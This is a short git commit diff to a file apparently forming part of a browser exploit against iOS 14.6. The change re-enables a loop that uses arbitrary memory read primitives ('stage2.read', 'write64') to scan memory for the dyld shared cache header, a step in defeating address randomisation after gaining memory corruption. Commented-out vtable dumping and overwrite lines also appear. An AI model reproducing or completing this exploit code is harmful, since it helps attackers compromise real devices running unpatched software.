b7b46983c471d1bbf20d2e121cdebb814951fe4c
Turnerhackz1 <turner881189@gmail.com>
2022-06-22 21:30:42 -0500

    Update 14.6.js

--- 14.6.js
+++ 14.6.js
@@ -660,7 +660,7 @@ function i2i(i,num) {
     var hdr = anchor - (i2i(anchor,0) & 0xfff);
     print("header" + hex1(hdr));
     print("hdr dump : " + String.fromCharCode(...stage2.read(hdr,0x100)));
-	/*while(true) {
+	while(true) {
 	if(strcmp(stage2.read(hdr, 0x10), "dyld_v1   arm64")) //cache header magic
         //webcore header magic...
         {
@@ -674,7 +674,7 @@ function i2i(i,num) {
 	}
         hdr = hdr - 0x1000;
         }
-	*/
+	
 	//var vtabledump = stage2.read(vtable,0x60);
 	//print("dump" + hexdump(vtabledump));
 	//stage2.write64(hex1(vtable),0x7777);
